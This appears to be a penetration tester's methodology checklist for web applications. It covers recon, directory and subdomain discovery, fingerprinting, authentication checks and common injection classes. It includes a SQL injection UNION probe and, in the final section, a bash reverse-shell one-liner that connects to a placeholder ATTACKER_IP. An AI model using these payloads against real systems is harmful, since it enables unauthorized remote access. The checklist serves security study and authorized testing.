
# 🕵️ Web Enumeration Methodology

## 1. Passive Recon (No direct interaction)

- Identify domains, subdomains, and infrastructure using public sources
- Check DNS records (A, MX, TXT, CNAME) for enumeration opportunities
- Analyze SSL/TLS certificates for hidden subdomains (certificate transparency logs)
- Gather domain intelligence via WHOIS records
    - [https://who.is/](https://who.is/)
- Use DNS analysis tools for enumeration and misconfigurations
    - DNS lookup tools
    - Zone transfer testing (AXFR) where applicable
- Check for exposed DNS zone transfers using `dig`

---

## 2. Active Recon (Direct target interaction)

### 2.1 Initial Setup

- Add target domain to `/etc/hosts` if required
- Validate connectivity and routing
- Identify open ports (including UDP where relevant)

---

### 2.2 Content & Directory Discovery

- Perform directory and file brute force
    - Directory & file fuzzing techniques
- Identify hidden endpoints:
    - `/robots.txt`
    - `/sitemap.xml`

---

### 2.3 Virtual Hosting & Subdomain Discovery

- Subdomain brute forcing
- Virtual host discovery (vhost fuzzing)

---

### 2.4 Web Crawling & Content Mapping

- Crawl application to map all reachable endpoints
    - Spidering / crawling tools (Burp Suite, ZAP, etc.)
- Extract and analyze:
    - Internal links
    - Hidden parameters
    - JavaScript endpoints

---

### 2.5 Information Leakage Analysis

- Inspect HTML comments for sensitive data
- Identify error messages (500 / 403 / debug pages) that leak:
    - Technology stack
    - File paths
    - Internal logic

---

### 2.6 Technology Fingerprinting

- Identify backend technologies and frameworks:
    - Wappalyzer (browser-based)
    - BuiltWith (external OSINT)
    - WhatWeb (CLI)
- Web server enumeration:
    - Nmap HTTP scripts
    - Banner grabbing (curl, headers)
- Detect WAF presence and behavior:
    - WAF fingerprinting tools

---

### 2.7 Web Application Enumeration (Technology-specific)

- Identify CMS / frameworks:
    - WordPress
    - Joomla
    - Drupal
    - Jenkins
    - Tomcat
    - Splunk
    - IIS-specific enumeration (e.g. tilde enumeration)
- Map version numbers for potential vulnerabilities

---

### 2.8 Vulnerability Mapping (Pre-Exploitation phase)

- Match discovered versions with known exploits:
    - Exploit-DB
    - Metasploit modules

---

### 2.9 Authentication & Session Analysis

- Identify login portals
- Test:
    - Default credentials
    - Weak passwords
    - Password reset mechanisms
- Analyze session security:
    - Secure / HttpOnly flags
    - Session fixation
    - CSRF protection

---

### 2.10 Input Surface Discovery

- Identify all input vectors:
    - Forms
    - Parameters
    - APIs
    - Headers
- Intercept traffic using Burp Suite

---

### 2.11 Input Testing (Core Vulnerability Testing)

Test every input based on context:

- Command Injection → system command execution context
- File Upload → upload bypass / malicious file execution
- SQL Injection → database interaction
    - UNION-based testing (`' UNION SELECT 1-- -`)
- IDOR → direct object reference manipulation
- LFI / Path Traversal → file system access
- XSS → client-side script injection
- HTTP verb tampering → access control bypass
- XXE → XML-based input exploitation

---

### 2.12 API / WebSocket Testing

- Inspect API endpoints
- Test request manipulation
- Check for SQL injection or logic flaws
- Tools: sqlmap where applicable

---

## 3. Shells & Payloads

- Reverse shells (Linux / Windows)
- Web shells
- Bind shells (where applicable)

### Web Shell → Reverse Shell (Linux example)

```
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'
```

- Always URL encode payloads when needed
- Stabilize shells after access (TTY upgrade techniques)